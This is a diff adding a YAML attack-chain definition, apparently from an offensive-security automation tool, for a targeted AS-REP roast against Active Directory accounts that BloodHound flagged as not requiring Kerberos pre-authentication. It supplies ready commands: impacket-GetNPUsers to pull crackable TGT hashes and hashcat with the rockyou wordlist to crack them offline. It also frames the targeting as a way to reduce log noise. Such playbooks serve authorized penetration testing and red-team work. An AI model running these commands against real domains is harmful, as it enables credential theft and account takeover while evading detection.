@@ -1,0 +1,26 @@
+chain_id: bloodhound_asreproast_targeted
+title: "AD — targeted AS-REP roast against accounts BloodHound flagged"
+severity: HIGH
+tags: [ad, kerberos, asreproast, bloodhound, targeted]
+
+trigger:
+  any_of:
+    - { kind: "ad-asreproast-target" }
+
+description: |
+  BloodHound identified one or more accounts with
+  `DontReqPreAuth` set. Unlike a blind sweep, you already know exactly
+  who is roastable — request TGTs only for those, save bandwidth and
+  log noise, then crack offline.
+
+steps:
+  - id: 1
+    title: "Request the TGT for the named user"
+    command: impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -no-pass -usersfile asrep_targets.txt -format hashcat -outputfile asrep.hash
+
+  - id: 2
+    title: "Crack offline (fires kerberos_asrep_roast chain on the resulting hash)"
+    command: hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
+
+references:
+  - https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
